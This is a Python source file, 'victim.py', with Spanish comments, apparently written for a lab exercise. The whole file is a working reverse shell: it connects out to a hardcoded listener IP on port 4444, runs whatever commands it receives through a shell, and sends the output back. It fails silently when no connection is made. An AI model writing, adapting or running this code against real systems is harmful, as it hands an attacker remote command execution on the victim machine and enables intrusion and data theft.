# victim.py
import socket
import subprocess
import os

# Cambia esta IP por la del "servidor" donde escucharÃ¡s
SERVER_IP = '192.168.198.132'  # â† Ajusta a la IP de tu equipo listener
SERVER_PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((SERVER_IP, SERVER_PORT))
    except:
        return  # falla silenciosamente si no puede conectar

    while True:
        try:
            command = s.recv(1024).decode().strip()
            if command.lower() == "exit":
                break
            elif command.startswith("cd "):
                os.chdir(command[3:])
                s.send(b"[+] Changed directory\n")
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
        except Exception as e:
            s.send(str(e).encode())
    s.close()

if __name__ == '__main__':
    connect()
